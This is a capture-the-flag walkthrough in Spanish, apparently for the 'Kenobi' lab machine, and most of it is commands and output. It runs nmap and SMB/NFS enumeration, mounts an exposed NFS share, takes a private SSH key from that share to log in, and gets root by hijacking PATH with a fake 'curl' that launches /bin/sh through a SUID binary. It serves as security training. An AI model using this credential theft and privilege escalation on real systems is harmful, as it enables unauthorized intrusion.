1. Escanear puertos con triple verbose
```sh
┌──(kali㉿kali)-[~/Documents/Kenobi] 
└─$ sudo nmap -vvv -n -p- -Pn -T5 10.10.252.0      
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-15 04:29 EDT   
Initiating SYN Stealth Scan at 04:29 
Scanning 10.10.252.0 [65535 ports]    
Discovered open port 445/tcp on 10.10.252.0  
Discovered open port 80/tcp on 10.10.252.0   
Discovered open port 22/tcp on 10.10.252.0   
Discovered open port 139/tcp on 10.10.252.0  
Discovered open port 111/tcp on 10.10.252.0  
Discovered open port 21/tcp on 10.10.252.0   
Discovered open port 2049/tcp on 10.10.252.0 
Discovered open port 49431/tcp on 10.10.252.0
SYN Stealth Scan Timing: About 41.26% done; ETC: 04:30 (0:00:44 remaining)   
Discovered open port 38657/tcp on 10.10.252.0
Discovered open port 40975/tcp on 10.10.252.0
Discovered open port 55121/tcp on 10.10.252.0
Completed SYN Stealth Scan at 04:30, 73.20s elapsed (65535 total ports)      
Nmap scan report for 10.10.252.0     
Host is up, received user-set (0.061s latency).      
Scanned at 2024-04-15 04:29:39 EDT for 74s   
Not shown: 65524 closed tcp ports (reset)    
PORT      STATE SERVICE      REASON  
21/tcp    open  ftp  syn-ack ttl 63  
22/tcp    open  ssh  syn-ack ttl 63  
80/tcp    open  http syn-ack ttl 63  
111/tcp   open  rpcbind      syn-ack ttl 63  
139/tcp   open  netbios-ssn  syn-ack ttl 63  
445/tcp   open  microsoft-ds syn-ack ttl 63  
2049/tcp  open  nfs  syn-ack ttl 63
38657/tcp open  unknown      syn-ack ttl 63
40975/tcp open  unknown      syn-ack ttl 63
49431/tcp open  unknown      syn-ack ttl 63
55121/tcp open  unknown      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 73.37 seconds
   Raw packets sent: 68624 (3.019MB) | Rcvd: 68522 (2.741MB)
```

2. Enumerar shares del smb 
```sh
┌──(kali㉿kali)-[~/Documents/Kenobi]
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.252.0
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-15 04:33 EDT
Nmap scan report for 10.10.252.0
Host is up (0.049s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.252.0\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.252.0\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.252.0\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 14.65 seconds
```

3. Ejecutar scripts para ver información del nfs en el puerto que redirige servicios `111` (**realmente estamos consultando al puerto que contiene el servicio nfs**) 

	The rcpbind utility maps RPC services to the ports on which they listen. RCP processes notify rpcbind when they start, registering the ports they are listening on and the RPC program numbers they expect to serve. The client system then contacts rpcbind on the server with a particular RPC program number. The rpcbind service redirects the client to the proper port number so it can communicate with the requeste service.
	
	`rcpbind` is a close analog of BIND, or really, any DNS server. If I recall correctly, you choose or are given a protocol number when you compile the RPC interface's declaration into server and client stub code with `rpcgen`.
	When a client signs up for a given interface on a particular host, usually with a `clnt_create()` call, the stub code asks `rpcbind` on that host a question, something like "on what udp or tcp port is protocol number X listening?" `rcpbind`, unlike most other ONC services, listens on TCP and UDP port 111, so given a host name or IP address, a program can just ask `rcpbind` responds with the appropiate port number, if a server has registered with it on that host. That registration is done by the server process when it calls `svc_create()`

```sh
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.241.225
```

4. Montar /var/tmp en nuestro directorio

```sh
mkdir /mnt/kenobiNFS  
mount 10.10.47.231:/var /mnt/kenobiNFS  
ls -la /mnt/kenobiNFS
```

5. Conectarse a kenobi con la rsa
```sh
# La necesitamos en un sitio que nos permita editar archivos (no solo lectura)
cp /mnt/kenobiNFS/tmp/id_rsa ~/Downloads
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.241.225
```

6. Buscar archivos con permisos SUID (permite ejecutar el archivo con los permisos del propietario)
```sh
find / -perm -u=s -type f 2>/dev/null


/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6

```

7. El /usr/bin/menu es raro... ejecutandolo sale esta interfaz

```sh
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

8. Ejecutamos strings (para ver las strings humanamente legibles en un binario) y nos damos cuenta que el archivo se ejecuta directamente en el sitio dónde está (se ejecuta de forma relativa no absoluta)
```sh
kenobi@kenobi:/tmp$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
```

9. Cómo el archivo se ejecuta como administrador podemos intentar ejecutar métodos a través de éste
```sh
# Necesitaremos una sh con permisos
echo /bin/sh > curl
chmod 777 curl

# Cambiamos la ruta de los binarios
export PATH=/tmp:$PATH
# Ejecutamos el menu
/usr/bin/menu
# Por último le damos a 1 y seremos root...
```